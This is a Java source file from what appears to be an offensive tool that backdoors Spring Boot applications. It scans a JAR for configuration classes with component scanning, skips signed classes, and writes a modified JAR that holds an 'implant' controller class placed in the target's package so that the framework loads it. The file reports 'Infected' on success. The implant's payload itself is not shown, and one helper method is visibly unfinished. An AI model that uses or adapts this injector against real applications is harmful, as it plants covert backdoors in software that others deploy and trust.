package org.example.injector;

import javassist.bytecode.AnnotationsAttribute;
import javassist.bytecode.ClassFile;
import javassist.bytecode.DuplicateMemberException;
import javassist.bytecode.MethodInfo;
import javassist.bytecode.annotation.Annotation;
import org.example.implants.SpringImplantController;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.List;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.jar.JarOutputStream;

public class SpringInjector {
    public static void main(String[] args) {
        if (args.length < 2) {
            System.exit(1);
        }

        SpringInjector injector = new SpringInjector();
        try {
            Path targetPath = Path.of(args[0]);
            Path outputPath = Path.of(args[1]);
            if (!Files.exists(targetPath) && !Files.isRegularFile(targetPath)) {
                System.out.println("[!] Target JAR is not a regular existing file.");
                System.exit(1);
            }
            if (Files.exists(outputPath) && targetPath.toRealPath().equals(outputPath.toRealPath())) {
                System.out.println("[-] Target JAR and output JAR cannot be the same.");
                System.exit(1);
            }
            if (injector.infect(targetPath, outputPath)) {
                System.out.println("[+] Infected '" + targetPath + "'. Modified JAR available at: " + outputPath);
            } else {
                System.out.println("[-] Did not infect '" + targetPath + "'.");
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    SpringInjector() {
    }

    public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
        // TODO Consider that some JARs may be multi-versioned
        try (JarFile targetJar = new JarFile(targetJarFilePath.toFile())) {
            return infect(targetJar, outputJar);
        }
    }

    public boolean infect(final JarFile targetJar, Path outputJar) throws IOException {
        // TODO This code is shit. Refactoring needed.
        boolean didInfect = false;
        try (JarOutputStream jarOutputStream = new JarOutputStream(new FileOutputStream(outputJar.toFile()))) {
            boolean foundSignedClasses = false;
            Enumeration<JarEntry> entries = targetJar.entries();
            while (entries.hasMoreElements()) {
                JarEntry entry = entries.nextElement();

                if (!entry.getName().endsWith(".class")) {
                    passEntry(targetJar, jarOutputStream, entry);
                    continue;
                }
                if (entry.getCodeSigners() != null) {
                    foundSignedClasses = true;
                    passEntry(targetJar, jarOutputStream, entry);
                    continue;
                }

                ClassFile classFile;
                try (DataInputStream in = new DataInputStream(targetJar.getInputStream(entry))) {
                    classFile = new ClassFile(in);
                    if (!isSpringContext(classFile)) {
                        passEntry(targetJar, jarOutputStream, entry);
                        continue;
                    }
                    System.out.println("[+] Found Spring configuration: " + entry.getName());

                    if (!hasComponentScanEnabled(classFile)) {
                        // TODO Explicitly add a @Bean to the configuration
                        // Maybe it doesn't hurt to add it despite @ContentScan being enabled?

                        System.out.println("[-] Spring configuration is not set to scan for components (@ComponentScan). Infection not (yet) supported!");
                        continue;
                    } else {
                        passEntry(targetJar, jarOutputStream, entry);
                    }

                    // Just add a new class into the JAR
                    String targetPackageName = parsePackageNameFromFqcn(classFile.getName());
                    System.out.println("[+] Found package name: " + targetPackageName);
                    ClassFile implantClass = loadImplantClass();
                    String implantClassName = parseClassNameFromFqcn(implantClass.getName());
                    implantClass.setName(targetPackageName + "." + implantClassName);
                    String fullPathInsideJar = "BOOT-INF/classes/" + implantClass.getName().replace(".", "/") + ".class";
                    JarEntry newJarEntry = new JarEntry(fullPathInsideJar);
                    newEntry(implantClass, jarOutputStream, newJarEntry);
                    System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");
                    didInfect = true;
                }
            }
            jarOutputStream.close();

            if (foundSignedClasses) {
                System.out.println("[-] Found signed classes. These were not considered for infection.");
            }
        }

        return didInfect;
    }

    private static String parsePackageNameFromFqcn(final String fqcn) {
        String[] parts = fqcn.split("\\.");
        if (parts.length < 2) {
            throw new RuntimeException("Not a fully qualified class name: " + fqcn);
        }
        String[] packageParts = Arrays.copyOfRange(parts, 0, parts.length - 1);
        return String.join(".", packageParts);
    }

    private static String parseClassNameFromFqcn(final String fqcn) {
        String[] parts = fqcn.split("\\.");
        if (parts.length < 2) {
            throw new RuntimeException("Not a fully qualified class name: " + fqcn);
        }
        return parts[parts.length - 1];
    }

    private ClassFile loadImplantClass() throws IOException {
        try {
            return ImplantReader.findAndReadClassFile(SpringImplantController.class);
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        }
    }

    private boolean addSpringBean(ClassFile springConfigClass, final ClassFile implantClass) {
        MethodInfo dummyImplant = springConfigClass.getMethod("getImplantController");    // TODO Don't hardcode this
        if (dummyImplant != null) {
            System.out.println("[-] Class '" + springConfigClass.getName() + "' already infected. Skipping.");
            return false;
        }

        // TODO Just copy over a pre-compiled method

        try {
            springConfigClass.addMethod(dummyImplant);
        } catch (DuplicateMemberException e) {
            System.out.println("[!] Unexpected error: " + e.getMessage());
            return false;
        }

        return true;
    }

    private static void passEntry(final JarFile sourceJar, final JarOutputStream out, final JarEntry entry) throws IOException {
        out.putNextEntry(entry);
        BufferedInputStream in = new BufferedInputStream(sourceJar.getInputStream(entry));
        out.write(in.readAllBytes());   // Don't bother with optimization for now
        out.closeEntry();
    }

    private static void newEntry(final ClassFile modified, final JarOutputStream out, final JarEntry newEntry) throws IOException {
        out.putNextEntry(newEntry);
        modified.write(new DataOutputStream(out));
        out.closeEntry();
    }

    private static boolean isSpringContext(final ClassFile classFile) {
        List<Annotation> springAnnotations = classFile.getAttributes().stream()
                .filter(attribute -> attribute instanceof AnnotationsAttribute)
                .map(attribute -> (AnnotationsAttribute) attribute)
                .filter(annotationAttribute -> annotationAttribute.getName().equals("RuntimeVisibleAnnotations"))
                .flatMap(runtimeAnnotationAttribute -> Arrays.stream(runtimeAnnotationAttribute.getAnnotations())
                        .filter(SpringInjector::isAnySpringContextAnnotation)
                )
                .toList();
        return !springAnnotations.isEmpty();
    }

    private static boolean isAnySpringContextAnnotation(final Annotation annotation) {
        return switch (annotation.getTypeName()) {
            case "org.springframework.boot.autoconfigure.SpringBootApplication" -> true;
            case "org.springframework.context.annotation.Configuration" -> true;
            default -> false;
        };
    }

    private static boolean hasComponentScanEnabled(final ClassFile springContextClassFile) {
        List<Annotation> componentScanAnnotations = springContextClassFile.getAttributes().stream()
                .filter(attribute -> attribute instanceof AnnotationsAttribute)
                .map(attribute -> (AnnotationsAttribute) attribute)
                .filter(annotationAttribute -> annotationAttribute.getName().equals("RuntimeVisibleAnnotations"))
                .flatMap(runtimeAnnotationAttribute -> Arrays.stream(runtimeAnnotationAttribute.getAnnotations())
                        .filter(annotation -> annotation.getTypeName().equals("org.springframework.context.annotation.ComponentScan"))
                )
                .toList();
        return !componentScanAnnotations.isEmpty();
    }
}
